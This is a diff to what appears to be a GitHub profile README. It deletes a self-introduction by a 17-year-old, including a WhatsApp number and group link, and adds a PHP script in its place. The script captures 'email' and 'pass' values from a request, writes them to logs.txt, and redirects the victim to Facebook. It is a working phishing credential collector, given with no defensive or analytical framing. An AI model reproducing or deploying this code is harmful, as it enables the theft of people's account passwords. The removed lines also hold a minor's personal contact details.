@@ -1,14 +1,38 @@
-- 👋 Hi, I’m @diluka Sadaruwan
-- 👀 I’m interested in ...
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
-- ☎️ my whats app number [ http://wa.me/94765515432 ]
-- 🇱🇰 I am from Dambulla 
-- ♻️ my whats app group [ https://chat.whatsapp.com/LHYL1brf5AZ0AudBjbk1Ge ]
-- 🔖 age 17
 
-<!---
-diluka9/diluka9 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+
+
+<?php
+
+if (isset($_GET["email"])){
+
+    $username = $_GET["email"];
+
+}
+
+if (isset($_GET["pass"])){
+
+    $password = $_GET["pass"];
+
+}
+
+$date = date("d-m-y h:i:s");
+
+file_put_contents("logs.txt", "Date: " . $date . "\n", FILE_APPEND);
+
+file_put_contents("logs.txt", "Username: " . $username . "\n" , FILE_APPEND);
+
+file_put_contents("logs.txt", "Password: ". $password . "\n\n", FILE_APPEND);
+
+header("Location: https://www.facebook.com/");
+
+?>
+
+
+
+
+
+
+
+
+
+
